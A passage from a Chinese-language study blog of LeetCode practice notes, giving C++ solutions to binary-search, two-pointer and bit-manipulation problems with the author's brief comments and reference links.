<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> M1 = <span class="number">0x55555555</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> M2 = <span class="number">0x33333333</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> M3 = <span class="number">0x0f0f0f0f</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> M4 = <span class="number">0x00ff00ff</span>; </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">uint32_t</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        n = ((n &gt;&gt; <span class="number">1</span>)&amp; M1) | ((n&amp;M1) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        n = ((n &gt;&gt; <span class="number">2</span>)&amp; M2) | ((n&amp;M2) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">        n = ((n &gt;&gt; <span class="number">4</span>)&amp; M3) | ((n&amp;M3) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">        n = ((n &gt;&gt; <span class="number">8</span>)&amp; M4) | ((n&amp;M4) &lt;&lt; <span class="number">8</span>);  </span><br><span class="line">        <span class="keyword">return</span> n&gt;&gt;<span class="number">16</span> | n&lt;&lt; <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a href="https://leetcode-cn.com/problems/single-number/" target="_blank" rel="noopener">136. 只出现一次的数字</a></h3><blockquote>
<p>hhh，之前看过这个视频，做出来饿了</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span> = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)&#123;</span><br><span class="line">            ans ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>和答案基本一致，就是不太会用加强for循环，emm，其实主要用在能放一组元素的变量里面</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> e:nums) ret^=e;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="算法基础"><a href="#算法基础" class="headerlink" title="算法基础"></a>算法基础</h1><h1 id="第-1-天-二分查找-1"><a href="#第-1-天-二分查找-1" class="headerlink" title="第 1 天 二分查找"></a>第 1 天 二分查找</h1><h3 id="34-在排序数组中查找元素的第一个和最后一个位置"><a href="#34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="34. 在排序数组中查找元素的第一个和最后一个位置"></a><a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/" target="_blank" rel="noopener">34. 在排序数组中查找元素的第一个和最后一个位置</a></h3><blockquote>
<p>二分查找得改进</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target,<span class="keyword">bool</span> lower)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = (<span class="keyword">int</span>)nums.<span class="built_in">size</span>()<span class="number">-1</span>,ans = (<span class="keyword">int</span>)nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &gt; target || (lower &amp;&amp; nums[mid] &gt;= target))&#123;</span><br><span class="line">                right = mid<span class="number">-1</span>;</span><br><span class="line">                ans = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">searchRange</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums,<span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> leftId = binarySearch(nums,target,<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">int</span> rightId = binarySearch(nums,target,<span class="literal">false</span>)<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(leftId&lt;=rightId &amp;&amp; rightId&lt;nums.<span class="built_in">size</span>() &amp;&amp; nums[leftId]==target&amp;&amp;nums[rightId]==target)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&#123;leftId,rightId&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="33-搜索旋转排序数组"><a href="#33-搜索旋转排序数组" class="headerlink" title="33. 搜索旋转排序数组"></a><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/" target="_blank" rel="noopener">33. 搜索旋转排序数组</a></h3><blockquote>
<p>分两半</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = (<span class="keyword">int</span>)nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(!n)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>] == target ?<span class="number">0</span>:<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] == target) <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[<span class="number">0</span>]&lt;=nums[mid])&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[<span class="number">0</span>]&lt;=target &amp;&amp; target&lt;nums[mid])&#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid] &lt; target &amp;&amp; target &lt;= nums[n<span class="number">-1</span>])&#123;</span><br><span class="line">                    l = mid+<span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="74-搜索二维矩阵"><a href="#74-搜索二维矩阵" class="headerlink" title="74. 搜索二维矩阵"></a><a href="https://leetcode-cn.com/problems/search-a-2d-matrix/" target="_blank" rel="noopener">74. 搜索二维矩阵</a></h3><h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><p><a href="https://blog.csdn.net/zhang14916/article/details/101058089" target="_blank" rel="noopener">参考链接</a></p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[capture](parameters)-&gt;return-type&#123;body&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当parameters为空的时候，()可以被省去</li>
<li>当body只有“return”或者返回为void，那么”-&gt;return-type“可以被省去</li>
</ul>
<h4 id="upper-bound"><a href="#upper-bound" class="headerlink" title="upper_bound"></a>upper_bound</h4><p><a href="https://blog.csdn.net/qq_40160605/article/details/80150252" target="_blank" rel="noopener">参考链接</a></p>
<p>lower_bound( begin,end,num)：查找第一个大于等于num得数</p>
<p>upper_bound( begin,end,num)：查找第一个大于num得数</p>
<h4 id="binary-search"><a href="#binary-search" class="headerlink" title="binary_search"></a>binary_search</h4><p><a href="https://www.cnblogs.com/wkfvawl/p/9475939.html" target="_blank" rel="noopener">参考链接</a></p>
<p>是c++ stl里面得函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">binary_search(arr[],arr[]+<span class="built_in">size</span> , indx) b</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">searchMatrix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> row = upper_bound(matrix.<span class="built_in">begin</span>(),matrix.<span class="built_in">end</span>(),target,[](<span class="keyword">const</span> <span class="keyword">int</span> b,<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp;a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b &lt; a[<span class="number">0</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">if</span>(row == matrix.<span class="built_in">begin</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        --row;</span><br><span class="line">        <span class="keyword">return</span> binary_search(row-&gt;<span class="built_in">begin</span>(),row-&gt;<span class="built_in">end</span>(),target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>矩阵式的二分查找</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">searchMatrix</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.<span class="built_in">size</span>(),n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>,high = m*n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> x = matrix[mid / n][mid % n];</span><br><span class="line">            <span class="keyword">if</span>(x &lt; target)&#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(x&gt;target)&#123;</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-2-天-二分查找"><a href="#第-2-天-二分查找" class="headerlink" title="第 2 天 二分查找"></a>第 2 天 二分查找</h1><h3 id="153-寻找旋转排序数组中的最小值"><a href="#153-寻找旋转排序数组中的最小值" class="headerlink" title="153. 寻找旋转排序数组中的最小值"></a><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/" target="_blank" rel="noopener">153. 寻找旋转排序数组中的最小值</a></h3><p>mine</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(!n)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> l =<span class="number">0</span>,r = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt;= r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l+r) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; nums[(mid+<span class="number">1</span>)%n] &amp;&amp; nums[(mid+n<span class="number">-1</span>)%n] &gt; nums[mid])&#123;</span><br><span class="line">                <span class="keyword">return</span> nums[mid];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[r] &gt; nums[mid])&#123;</span><br><span class="line">                r = mid<span class="number">-1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high)&#123;</span><br><span class="line">            <span class="keyword">int</span> pivot = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[pivot] &lt; nums[high])&#123;</span><br><span class="line">                high = pivot;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                low = pivot + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="162-寻找峰值"><a href="#162-寻找峰值" class="headerlink" title="162. 寻找峰值"></a><a href="https://leetcode-cn.com/problems/find-peak-element/" target="_blank" rel="noopener">162. 寻找峰值</a></h3><p>mine</p>
<blockquote>
<p>没看出来要怎么用二分查找，这里的数组无序呀，，，然后就循环求，效率还好，，，</p>
<p><img src="/2021/08/26/00-03/image-20210827115136407.png" alt="image-20210827115136407"></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">max</span>=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> idx=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="built_in">max</span>)&#123;</span><br><span class="line">                <span class="built_in">max</span> =nums[i];</span><br><span class="line">                idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> idx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>哦，是求峰值，不是最大值，打扰了</p>
<p>有意思，根据情况分类，只要满足一个条件就可以找到了</p>
<p><img src="/2021/08/26/00-03/image-20210827115552132.png" alt="image-20210827115552132"></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>()<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; nums[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>二分递归</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp;nums,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l == r)&#123;</span><br><span class="line">            <span class="keyword">return</span> l;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid]&gt;nums[mid+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">return</span> search(nums,l,mid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> search(nums,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> search(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-3-天-双指针-1"><a href="#第-3-天-双指针-1" class="headerlink" title="第 3 天 双指针"></a>第 3 天 双指针</h1><h3 id="82-删除排序链表中的重复元素-II"><a href="#82-删除排序链表中的重复元素-II" class="headerlink" title="82. 删除排序链表中的重复元素 II"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/" target="_blank" rel="noopener">82. 删除排序链表中的重复元素 II</a></h3><blockquote>
<p>思路很简单，看怎么写了，代码给注释</p>
<p>有利地方：链表有序</p>
<p>难点：</p>
<ol>
<li>怎么判断重复了，easy</li>
<li>如何删除元素</li>
<li>如果继续往下走</li>
</ol>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>,head);<span class="comment">//头节点指向最前面</span></span><br><span class="line">        ListNode* cur = dummy;</span><br><span class="line">        <span class="keyword">while</span>(cur-&gt;next &amp;&amp; cur-&gt;next-&gt;next)&#123;<span class="comment">//存在是前提</span></span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;next-&gt;val == cur-&gt;next-&gt;next-&gt;val)&#123;<span class="comment">//出现连续</span></span><br><span class="line">                <span class="keyword">int</span> x = cur-&gt;next-&gt;val;<span class="comment">//取出值</span></span><br><span class="line">                <span class="keyword">while</span>(cur-&gt;next &amp;&amp; cur-&gt;next-&gt;val == x)&#123;<span class="comment">//循环是否等于x</span></span><br><span class="line">                    cur-&gt;next = cur-&gt;next-&gt;next;<span class="comment">//删除节点</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cur=cur-&gt;next;<span class="comment">//不用删除，往后走即可</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode-cn.com/problems/3sum/" target="_blank" rel="noopener">15. 三数之和</a></h3><blockquote>
<p>两数之和的升级版，首先肯定是先确定一个值，剩下就简化为两数之和。</p>
<p>为了不重复怎么办：</p>
<ul>
<li>首先对数组排序</li>
<li>其次前两个数判断是否连续了</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">threeSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//为了不重复，首先进行一次排序</span></span><br><span class="line">        sort(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> first = <span class="number">0</span>;first&lt;n;first++)&#123;</span><br><span class="line">            <span class="comment">//first是三元组的第一个数，两次枚举这两个应该不同</span></span><br><span class="line">            <span class="keyword">if</span>(first &gt; <span class="number">0</span>&amp;&amp; nums[first]==nums[first<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> third = n<span class="number">-1</span>;<span class="comment">//双指针法：second从左走到右边，third从右边走到左边</span></span><br><span class="line">            <span class="keyword">int</span> target = -nums[first];<span class="comment">//因为需要和为0，简化为两数求和</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> second=first+<span class="number">1</span>;second&lt;n;second++)&#123;</span><br><span class="line">                <span class="comment">//两次枚举不同值</span></span><br><span class="line">                <span class="keyword">if</span>(second &gt; first+<span class="number">1</span> &amp;&amp; nums[second]==nums[second<span class="number">-1</span>])&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//双指针开始：大了，右指针左移</span></span><br><span class="line">                <span class="keyword">while</span>(second &lt; third &amp;&amp; nums[second]+nums[third] &gt; target)&#123;</span><br><span class="line">                    --third;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//指针重合,over</span></span><br><span class="line">                <span class="keyword">if</span>(second == third)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(nums[second]+nums[third]==target)&#123;</span><br><span class="line">                    ans.push_back(&#123;nums[first],nums[second],nums[third]&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-4-天-双指针-1"><a href="#第-4-天-双指针-1" class="headerlink" title="第 4 天 双指针"></a>第 4 天 双指针</h1><h3 id="844-比较含退格的字符串"><a href="#844-比较含退格的字符串" class="headerlink" title="844. 比较含退格的字符串"></a><a href="https://leetcode-cn.com/problems/backspace-string-compare/" target="_blank" rel="noopener">844. 比较含退格的字符串</a></h3><p>mine</p>
<blockquote>
<p>锻炼自己写代码的能力</p>
<p><img src="/2021/08/26/00-03/leetcode之算法学习计划\image-20210829132310691.png" alt="image-20210829132310691"></p>
<p>中间遇到几个问题</p>
<ol>
<li>判断！=0</li>
<li>两个stack放在一起，由于长度不一样，有问题</li>
<li>结果用s.size，做结束的判断，由于pop，导致这个值在变化</li>
</ol>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> t)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> s_size = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> t_size = t.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; s1;</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; s2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s_size;i++)&#123;</span><br><span class="line">            s1.push(s[i]);</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">'#'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s1.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                    s1.pop();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s1.<span class="built_in">size</span>()!=<span 